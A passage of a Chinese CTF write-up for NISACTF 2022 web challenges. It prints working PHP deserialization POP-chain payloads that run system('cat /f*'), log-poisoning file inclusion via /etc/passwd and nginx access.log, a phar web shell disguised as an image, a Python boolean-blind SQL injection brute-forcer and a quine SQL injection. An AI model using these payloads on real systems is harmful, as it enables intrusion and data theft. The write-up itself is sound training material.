class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include &quot;waf.php&quot;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nisa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$nisa</span>-&gt;fun = <span class="string">&quot;show&quot;</span>;</span><br><span class="line"><span class="variable">$nisa</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$Ilt</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$Ilt</span>-&gt;su = <span class="variable">$nisa</span>; <span class="comment">//将$nisa对象当做函数利用时，会调用$nisa对象的__invoke()方法</span></span><br><span class="line"><span class="variable">$four</span> = <span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$four</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>;</span><br><span class="line"><span class="variable">$four</span>-&gt;a = <span class="variable">$Ilt</span>; <span class="comment">//将$Ilt对象当做字符串使用时会调用$Ilt对象里面的__tostring()方法</span></span><br><span class="line"><span class="variable">$Ilt</span>-&gt;huang = <span class="variable">$four</span>;  <span class="comment">//four里面有fun属性了，fun属性为一个不可访问的属性，给不可访问的属性赋值时会调用__set()方法</span></span><br><span class="line"><span class="variable">$TXW</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>();</span><br><span class="line"><span class="variable">$TXW</span>-&gt;ext=<span class="variable">$Ilt</span>; <span class="comment">//Ilovetxw并没有nisa方法 所以会触发__call</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$TXW</span>));</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include &quot;waf.php&quot;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nisa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$nisa</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$Ilt</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$Ilt</span>-&gt;su = <span class="variable">$nisa</span>; <span class="comment">//将$nisa对象当做函数利用时，会调用__invoke()方法</span></span><br><span class="line"><span class="variable">$nisa</span>-&gt;fun = <span class="variable">$Ilt</span>; <span class="comment">//将$Ilt对象当做字符串利用时，会调用__toString()方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nisa</span>));</span><br></pre></td></tr></table></figure><h2 id="popchains"><a href="#popchains" class="headerlink" title="popchains"></a>popchains</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page; <span class="comment">// 4 string = Make_a_Change的实例化对象，Make_a_Change类中没有page属性，触发Make_a_Change的__get方法。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="comment">// 5 page = Road_is_Long的实例化对象，触发Road_is_Long的__tostring方法。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); <span class="comment">// 1 漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>); <span class="comment">// 2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>(); <span class="comment">// 3 effort = Try_Work_Hard的实例化对象，对象当做函数调用，触发Try_Work_Hard类的__invoke方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我先包含的&#x2F;etc&#x2F;passwd，看是否可以包含到，再查看服务器类型，发现是nginx，直接包含&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，进行RCE既可以。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;/var/log/nginx/access.log&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$twh</span> = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$mac</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$mac</span> -&gt; effort = <span class="variable">$twh</span>;</span><br><span class="line"><span class="variable">$rsl</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$rsl</span> -&gt; <span class="keyword">string</span> = <span class="variable">$mac</span>;</span><br><span class="line"><span class="variable">$rsl1</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$rsl1</span> -&gt; page = <span class="variable">$rsl</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$rsl1</span>));</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250623161421278.png" class="" title="image-20250623161421278"><h2 id="bingdundun"><a href="#bingdundun" class="headerlink" title="bingdundun~"></a>bingdundun~</h2><img src="/CTFwp/NISACTF-2022/image-20250623170217628.png" class="" title="image-20250623170217628"><p>包含了一下index.php，发现会进行无限包含，自带php后缀。</p><p>再进行文件上传的时候，发现只能上传png后缀和zip后缀；只检测后缀并没有检测文件内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?=`$_POST[1]`?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.php&#x27;</span>,<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>将payload.phar文件更改为zip后缀或png后缀的文件；进行文件上传，再进行命令执行即可。</p><img src="/CTFwp/NISACTF-2022/image-20250623171406354.png" class="" title="image-20250623171406354"><p><strong>phar:&#x2F;&#x2F;伪协议识别的是<code>&lt;?php __HALT_COMPILER();?&gt;</code>作为标志，而不是后缀。</strong></p><h2 id="join-us"><a href="#join-us" class="headerlink" title="join-us"></a>join-us</h2><p>进入登录，发现：</p><img src="/CTFwp/NISACTF-2022/image-20250626111803645.png" class="" title="image-20250626111803645"><p>这里应该有注入点；测试注入点的闭合方式。</p><p>输入单引号：</p><img src="/CTFwp/NISACTF-2022/image-20250626111929667.png" class="" title="image-20250626111929667"><p>报错，说明闭合方式为单引号。</p><p>在准备测试列数的时候，发现by被过滤了。</p><p>在这里进行一次模糊测试。</p><p>union被过滤，联合查询注入不行,堆叠注入也不行,&#x3D;也被过滤了,布尔盲注和时间盲注也不行。</p><p>报错注入可以：</p><img src="/CTFwp/NISACTF-2022/image-20250626141044029.png" class="" title="image-20250626141044029"><img src="/CTFwp/NISACTF-2022/image-20250626141233997.png" class="" title="image-20250626141233997"><p>mid截取(substr被过滤)：</p><img src="/CTFwp/NISACTF-2022/image-20250626141437647.png" class="" title="image-20250626141437647"><img src="/CTFwp/NISACTF-2022/image-20250626141605973.png" class="" title="image-20250626141605973"><img src="/CTFwp/NISACTF-2022/image-20250626141621528.png" class="" title="image-20250626141621528"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema,</span><br><span class="line">mysql,</span><br><span class="line">ctftraining,</span><br><span class="line">performance_schema,</span><br><span class="line">test,</span><br><span class="line">sqlsql</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250626142741439.png" class="" title="image-20250626142741439"><p>图片缺失：<code>concat(table_name) from</code></p><p>查一下FLAG_TABLE；由于过滤了column；union也被过滤了，这里用join泄露列名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLAG_TABLE,</span><br><span class="line">news,</span><br><span class="line">users</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250626143243011.png" class="" title="image-20250626143243011"><img src="/CTFwp/NISACTF-2022/image-20250626143402495.png" class="" title="image-20250626143402495"><p>感觉不可能在FLAG_TABLE，查sqlsql数据库</p><img src="/CTFwp/NISACTF-2022/image-20250626144208756.png" class="" title="image-20250626144208756"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fal_flag,</span><br><span class="line">output</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250626144459677.png" class="" title="image-20250626144459677"><img src="/CTFwp/NISACTF-2022/image-20250626144520873.png" class="" title="image-20250626144520873"><img src="/CTFwp/NISACTF-2022/image-20250626144547444.png" class="" title="image-20250626144547444"><p>说flag不在这个里面，在另一个里面。</p><img src="/CTFwp/NISACTF-2022/image-20250626144648697.png" class="" title="image-20250626144648697"><img src="/CTFwp/NISACTF-2022/image-20250626144710012.png" class="" title="image-20250626144710012"><p>mid截取flag：</p><img src="/CTFwp/NISACTF-2022/image-20250626144752938.png" class="" title="image-20250626144752938"><img src="/CTFwp/NISACTF-2022/image-20250626144807238.png" class="" title="image-20250626144807238"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;cae214f6-f54d-4ed8-a005-fda8094bb7a3&#125;</span><br></pre></td></tr></table></figure><h2 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h2><p>题目提示：</p><img src="/CTFwp/NISACTF-2022/image-20250629164242757.png" class="" title="image-20250629164242757"><p>先进行抓包：</p><p>username 输入 bilala，password 输入 <code>&#39;&#123;模糊测试的字典&#125;#</code>：进行模糊测试。</p><p>过滤的比较多，说一些主要的：&#x3D; substr 空格。</p><p>再进行测试的时候发现：<code>&#39; or 1</code>和<code>&#39; or 0</code> 这两个的返回结果不一样，觉得可以进行布尔盲注爆破出passwd。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:21135/login.php&#x27;</span></span><br><span class="line">char_list = string.digits + string.ascii_letters + <span class="string">&#x27;_~&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> char_list:</span><br><span class="line">        payload = <span class="string">f&quot;&#x27;/**/or/**/mid((select/**/passwd/**/from/**/users/**/where/**/username/**/like/**/&#x27;bilala&#x27;),<span class="subst">&#123;i&#125;</span>,1)/**/like/**/&#x27;<span class="subst">&#123;j+<span class="string">&#x27;%&#x27;</span>&#125;</span>&#x27;#&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;bilala&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong password&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            password += j</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>+password)</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250629164902748.png" class="" title="image-20250629164902748"><p>登录：</p><img src="/CTFwp/NISACTF-2022/image-20250629164931212.png" class="" title="image-20250629164931212"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># passwd 的返回结果 等于 我们输入的内容。</span></span><br><span class="line"><span class="comment"># password 不能等于 b2f2d15b3ae082ca29697d8dcd420fd7</span></span><br><span class="line"><span class="comment"># 得到flag。</span></span><br><span class="line"><span class="comment"># quine注入</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,0x22,0x27),0x2e,&quot;.&quot;)#&#x27;,0x22,0x27),0x2e,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,0x22,0x27),0x2e,&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250629165120987.png" class="" title="image-20250629165120987"><h2 id="level-up"><a href="#level-up" class="headerlink" title="level-up"></a>level-up</h2><img src="/CTFwp/NISACTF-2022/image-20250630101836190.png" class="" title="image-20250630101836190"><p>disallow: 在robots.txt中才会出现；访问robots.txt即可。</p><img src="/CTFwp/NISACTF-2022/image-20250630101934566.png" class="" title="image-20250630101934566"><p>进入第二关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 2</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 2 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>强制类型转换为string，md5强碰撞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\fastcoll_v1.0.0.5.exe -p ywj.txt -o 1.txt 2.txt</span><br><span class="line"></span><br><span class="line">ywj.txt 空文件 </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_file</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&#x27;./1.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span 